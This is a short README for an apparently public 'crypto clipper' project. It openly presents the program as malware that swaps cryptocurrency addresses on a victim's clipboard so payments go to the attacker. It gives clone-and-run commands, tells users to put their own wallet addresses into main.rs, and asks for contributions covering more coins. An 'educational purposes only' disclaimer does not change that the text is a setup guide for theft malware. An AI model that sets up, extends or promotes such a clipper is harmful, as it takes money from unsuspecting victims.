# Crypto clipper

This application is a simple example of malware that constantly checks the victim's clipboard for cryptocurrency addresses and replaces them with the attacker's address. This causes the victim to accidentally send the attacker money they meant to send to a third party.

## How to install

```
git clone https://github.com/f1nzo/crypto-clipper
cd crypto-clipper 
cargo run
```

note: remember to replace the crypto wallets in main.rs with your own

## How to contribute

This project is extremely small, but if you are interested in contributing, please feel free to add the proper support for other popular cryptocurrencies; please keep in mind that you will need the regex for each cryptocurrency you would like to add.

## DISCLAIMER

This application is for EDUCATIONAL PURPOSES ONLY and should never be used in any illegal way. I created this app to show how easily a malicious hacker can write one of these scripts and raise awareness of this dangerous malware.